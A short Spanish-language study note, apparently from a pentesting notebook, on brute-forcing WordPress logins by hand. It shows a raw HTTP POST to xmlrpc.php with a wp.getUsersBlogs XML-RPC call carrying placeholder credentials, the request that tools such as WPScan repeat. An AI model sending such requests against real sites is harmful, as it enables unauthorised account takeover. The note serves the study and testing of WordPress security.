------------------------------
- Tags: #web #scripting #bash #tools #wordpress #vuln
----------------

Si quiseramos aplicar fuerza bruta en un [[WordPress]] de la misma forma que hace [[Wpscan]] pero de forma manual,para descubrir credenciales validas, seria necesario tramitar una peticion por POST
al archivo *xmlrpc.php* tramitando una estructura en XML tal que asi:

```xml
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235
//
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```

